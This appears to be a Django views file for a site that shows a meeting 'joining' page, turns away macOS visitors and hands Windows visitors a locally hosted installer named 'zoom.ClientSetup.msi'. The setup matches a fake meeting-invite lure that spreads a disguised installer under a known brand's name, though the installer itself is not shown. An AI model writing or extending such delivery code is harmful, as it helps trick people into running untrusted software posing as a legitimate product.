from pathlib import Path

from django.conf import settings
from django.http import FileResponse, Http404
from django.shortcuts import redirect, render


def _is_mac_user_agent(request) -> bool:
    ua = (request.META.get("HTTP_USER_AGENT") or "").lower()
    # macOS desktop browsers typically include "macintosh" / "mac os x"
    return ("macintosh" in ua or "mac os x" in ua) and "windows" not in ua

def joining(request):
    return render(request, "joining.html")

def pc_only(request):
    return render(request, "pc_only.html")



def home(request):
    if _is_mac_user_agent(request):
        return redirect("pc_only")
    return render(request, "home.html")


def download_client_setup(request):
    if _is_mac_user_agent(request):
        return render(request, "pc_only.html", status=403)
    path = Path(settings.BASE_DIR) / "zoom.ClientSetup.msi"
    if not path.is_file():
        raise Http404("Installer not found")
    return FileResponse(
        path.open("rb"),
        as_attachment=True,
        filename="zoom.ClientSetup.msi",
    )
